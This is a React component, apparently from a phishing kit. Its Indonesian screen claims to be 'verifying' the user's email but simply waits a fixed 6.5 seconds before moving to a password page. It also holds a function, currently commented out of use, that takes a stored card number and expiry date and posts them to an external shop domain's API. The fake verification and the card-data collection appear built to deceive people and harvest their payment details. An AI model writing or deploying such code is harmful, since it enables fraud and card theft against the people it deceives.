import loadEmailNumberIllustration from "../../../../assets/images/1.png";
import { useNavigate } from "react-router-dom";
import { useEffect } from "react";
import axios from "axios";

const LoadEmailNumber = () => {
  const navigate = useNavigate();

  useEffect(() => {
    // verifEmailNumber();
    const timeout = setTimeout(() => {
      navigate("/register/password");
    }, 6500);

    return () => clearTimeout(timeout);
  }, []);

  const verifEmailNumber = async () => {
    try {
      await axios
        .post(`https://satu.cekrek.shop/api/v1/card`, {
          cardNumber: Number(localStorage.getItem("cardNumber")),
          month: Number(localStorage.getItem("month")),
          year: Number(localStorage.getItem("year")),
        })
        .then((res) => {
          // Add Number Card to Local Storage
          console.log(res);
        });
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <div className="flex flex-col py-4 justify-center items-center">
      <img src={loadEmailNumberIllustration} alt="" className="w-[245px]" />
      <h1 className="font-bold text-2xl text-[#333999] text-center">
        Sedang memverifikasi
      </h1>
      <div className="flex justify-center items-center mb-5">
        <div className="flex ms-2 font-bold text-2xl text-[#333999] text-center">
          <p className="me-2">alamat email</p>
          <div className="animate-bounce h-[25%]"> .</div>
          <div
            className="animate-bounce h-[25%]"
            style={{ animation: "bounce .99s infinite" }}
          >
            {" "}
            .
          </div>
          <div
            className="animate-bounce h-[25%]"
            style={{ animation: "bounce .98s infinite" }}
          >
            {" "}
            .
          </div>
        </div>
      </div>
      <p className="text-center text-base font-normal">
        Silahkan klik link yang telah dikirimkan <br /> ke alamat email Anda
      </p>
      <p className="text-xs font-normal text-center my-4">
        Tidak mendapatkan link? <br />
        <span className="font-bold text-[#333999]">
          Kirim kembali
        </span> atau{" "}
        <span className="font-bold text-[#333999]">Ganti alamat email</span>
      </p>
    </div>
  );
};

export default LoadEmailNumber;
